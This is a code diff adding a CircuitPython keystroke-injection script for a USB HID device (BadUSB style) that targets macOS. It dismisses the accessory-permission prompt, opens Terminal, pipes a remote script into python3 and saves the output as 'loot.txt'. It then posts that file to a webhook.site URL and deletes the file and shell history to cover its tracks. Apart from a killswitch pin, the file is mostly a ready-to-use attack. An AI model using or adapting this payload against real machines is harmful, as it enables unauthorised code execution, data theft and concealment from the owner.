@@ -1,0 +1,46 @@
+import time
+import board
+import digitalio
+import usb_hid
+import sys
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
+from adafruit_hid.keycode import Keycode
+
+# Give yourself 2 seconds to unplug if you panic!
+time.sleep(2)
+
+# Create a 'Lock' on Pin 0 (KILLSWITCH!!!!!)
+button = digitalio.DigitalInOut(board.GP0)
+button.switch_to_input(pull=digitalio.Pull.UP)
+
+# SAFETY CHECK: If Pin 0 is NOT connected to GND, the script dies here.
+if button.value:
+    sys.exit()
+
+# Set up the "Hands"
+kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(kbd)
+
+# --- THE ATTACK ---
+
+# Step 1: Smash ENTER to bypass the "Allow Accessory" popup
+kbd.send(Keycode.ENTER)
+time.sleep(1)
+
+# Step 2: Open Terminal
+kbd.send(Keycode.GUI, Keycode.SPACE)
+time.sleep(0.5)
+layout.write("Terminal\n")
+time.sleep(1.5)
+
+# Step 3: The Payload
+# (We define the 'url' variable here so the line below knows what to type)
+url = "https://githubusercontent.com"
+layout.write(f"curl -sS {url} | python3 - | tee loot.txt\n")
+
+# Step 4: save loot.txt and remove evidence
+# (Added a tiny sleep to let the scan finish before we try to upload)
+time.sleep(1)
+web_hook_url = "https://webhook.site/9f0b15b8-16ab-466c-802c-c2cbbfb5d05a"
+layout.write(f"curl -X POST -d @loot.txt {web_hook_url} && rm loot.txt && history -c && exit\n")
